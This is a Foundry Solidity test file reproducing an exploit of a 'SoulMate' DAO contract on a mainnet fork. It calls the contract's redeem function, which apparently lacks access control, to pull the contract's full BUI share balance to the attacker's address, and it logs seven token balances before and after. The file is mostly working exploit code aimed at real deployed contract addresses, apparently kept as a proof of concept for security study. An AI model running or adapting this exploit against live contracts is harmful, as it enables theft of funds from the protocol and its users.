// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

interface ISoulMate {
    function redeem(uint256 _shares, address _receiver) external;
}

ISoulMate constant soulMate = ISoulMate(
    0x82C063AFEFB226859aBd427Ae40167cB77174b68
);
IERC20 constant BUI = IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);
IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
IERC20 constant MATIC = IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
IERC20 constant AAVE = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
IERC20 constant ENS = IERC20(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
IERC20 constant ZRX = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
IERC20 constant UNI = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

contract DaoSoulMateTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19063676);
        vm.label(address(soulMate), "soulMate");
        vm.label(address(BUI), "BUI");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(MATIC), "MATIC");
        vm.label(address(AAVE), "AAVE");
        vm.label(address(ENS), "ENS");
        vm.label(address(ZRX), "ZRX");
        vm.label(address(UNI), "UNI");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print(
            "USDC balance before",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        print(
            "DAI balance before",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
        print(
            "MATIC balance before",
            MATIC.balanceOf(address(this)),
            MATIC.decimals()
        );
        print(
            "AAVE balance before",
            AAVE.balanceOf(address(this)),
            AAVE.decimals()
        );
        print(
            "ENS balance before",
            ENS.balanceOf(address(this)),
            ENS.decimals()
        );
        print(
            "ZRX balance before",
            ZRX.balanceOf(address(this)),
            ZRX.decimals()
        );
        print(
            "UNI balance before",
            UNI.balanceOf(address(this)),
            UNI.decimals()
        );

        // No access control
        soulMate.redeem(BUI.balanceOf(address(soulMate)), address(this));

        print(
            "USDC balance after",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        print(
            "DAI balance after",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
        print(
            "MATIC balance after",
            MATIC.balanceOf(address(this)),
            MATIC.decimals()
        );
        print(
            "AAVE balance after",
            AAVE.balanceOf(address(this)),
            AAVE.decimals()
        );
        print(
            "ENS balance after",
            ENS.balanceOf(address(this)),
            ENS.decimals()
        );
        print(
            "ZRX balance after",
            ZRX.balanceOf(address(this)),
            ZRX.decimals()
        );
        print(
            "UNI balance after",
            UNI.balanceOf(address(this)),
            UNI.decimals()
        );
    }
}
